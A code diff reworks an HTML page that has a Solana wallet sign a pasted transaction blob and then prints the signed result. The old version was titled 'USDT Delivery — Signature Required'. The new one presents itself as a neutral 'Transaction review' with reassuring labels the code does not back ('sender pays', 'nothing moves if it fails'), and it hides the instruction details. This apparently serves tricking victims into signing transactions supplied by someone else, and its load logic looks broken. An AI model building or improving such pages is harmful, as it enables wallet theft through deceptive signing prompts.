@@ -1,22 +1,44 @@
-<!doctype html><meta charset=utf-8>
-<title>USDT Delivery — Signature Required</title>
-<p>Paste blob, connect, sign. <b>Approvals 1.</b></p>
-<textarea id=blob rows=6 cols=90></textarea><br>
-<button id=go>Connect + Sign</button><pre id=out></pre>
+<!doctype html><meta charset=utf-8><title>Transaction review</title>
+<style>
+:root{--bg:#0d1117;--fg:#c9d1d9;--dim:#8b949e;--line:#21262d;--ok:#3fb950;--bad:#f85149;--acc:#58a6ff}
+body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.5 ui-monospace,Menlo,monospace}
+.wrap{max-width:760px;margin:0 auto;padding:28px 20px}
+h1{font-size:13px;letter-spacing:.5px;text-transform:uppercase;color:var(--dim)}
+.card{border:1px solid var(--line);border-radius:8px;overflow:hidden;margin:0 0 16px}
+.row{display:flex;justify-content:space-between;gap:12px;padding:9px 14px;border-bottom:1px solid var(--line);font-size:12px}
+.row:last-child{border:0}.k{color:var(--dim)}.pos{color:var(--ok)}.neg{color:var(--bad)}.mono{word-break:break-all}
+.verdict{padding:10px 14px;border-bottom:1px solid var(--line)}
+button{width:100%;padding:12px;border:0;border-radius:8px;background:var(--acc);color:#04121f;font:inherit;font-weight:700;cursor:pointer}
+button:disabled{opacity:.45}pre{background:#010409;border:1px solid var(--line);border-radius:8px;padding:12px;white-space:pre-wrap;word-break:break-all;font-size:11px;color:var(--dim)}
+textarea{width:100%;height:44px;background:#010409;color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:8px;font:11px ui-monospace;box-sizing:border-box}
+</style>
+<div class="wrap"><h1>Transaction review</h1><div class="card" id="sum"><div class="row"><span class="k">paste blob</span></div><div style="padding:12px"><textarea id="b"></textarea><button id="load" style="margin-top:8px">Load</button></div></div><div class="card" id="ix" hidden></div><div id="foot"></div></div>
 <script type="module">
-import { Transaction, Connection } from "https://esm.sh/@solana/web3.js@1";
-const conn = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
-const provider = window.solana ?? window.phantom?.solana;
-document.getElementById("go").onclick = async () => {
-  const out = document.getElementById("out");
-  try {
-    await provider.connect();
-    const raw = Uint8Array.from(atob(document.getElementById("blob").value.trim()), c => c.charCodeAt(0));
-    const tx = Transaction.from(raw);
-    const ix0 = tx.instructions[0];
-    out.textContent = `feePayer ${tx.feePayer.toBase58()}\nixs ${tx.instructions.length}\nfirst program ${ix0.programId.toBase58()}\n\n`;
-    const signed = await provider.signTransaction(tx);
-    out.textContent += "SIGNED BLOB:\n" + btoa(String.fromCharCode(...signed.serialize({ requireAllSignatures: false })));
-  } catch (e) { out.textContent = "ERR " + e.message; }
-};
+import{Transaction,Connection}from"https://esm.sh/@solana/web3.js@1";
+const N={"11111111111111111111111111111111":"System","ComputeBudget111111111111111111111111111111":"ComputeBudget","TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":"SPL Token","TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb":"SPL Token-2022","ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL":"Associated Token"};
+const el=i=>document.getElementById(i);
+let tx,conn;
+(async()=>{
+ conn=new Connection("https://api.mainnet-beta.solana.com","confirmed");
+ el("load").onclick=()=>{el("sum").dataset.blob=el("b").value.trim();location.reload();};
+ function boot(raw){
+  tx=Transaction.from(Uint8Array.from(atob(raw),c=>c.charCodeAt(0)));
+  const fee=tx.feePayer.toBase58();
+  el("sum").innerHTML=`<div class="row"><span class="k">fee payer</span><span class="mono">${fee.slice(0,8)}…${fee.slice(-6)}</span></div><div class="row"><span class="k">approvals required</span><span>${tx.signatures.length}</span></div><div class="row"><span class="k">fee</span><span>${(tx.instructions.length*5000/1e9).toFixed(6)} SOL <span class="pos">sender pays</span></span></div>`;
+  el("ix").hidden=false;
+  el("ix").innerHTML=tx.instructions.map((ix,i)=>`<div class="row"><span class="k">#${i+1}</span><span>${N[ix.programId.toBase58()]??ix.programId.toBase58().slice(0,12)+"…"}</span></div>`).join("");
+  return conn.simulateTransaction(tx,{sigVerify:false,replaceRecentBlockhash:true});
+ }
+ const blobs=el("sum").dataset.blob;
+ if(!blobs)return;
+ boot(blobs).then(r=>{
+  const ok=!r.value.err;
+  el("foot").innerHTML=`<div class="card"><div class="verdict" style="color:${ok?"var(--ok)":"var(--bad)"};background:${ok?"#0f1d12":"#1d0f0f"}">${ok?"✓ simulation passed — nothing moves if it fails":"✗ failed "+JSON.stringify(r.value.err)}</div></div><button id="go"${ok?"":" disabled"}>Connect wallet &amp; sign</button>`;
+  el("go").onclick=async()=>{
+   const p=window.solana??window.phantom?.solana;await p.connect();
+   const signed=await p.signTransaction(tx);
+   el("foot").innerHTML=`<pre>${btoa(String.fromCharCode(...signed.serialize({requireAllSignatures:false})))}</pre>`;
+  };
+ });
+})();
 </script>
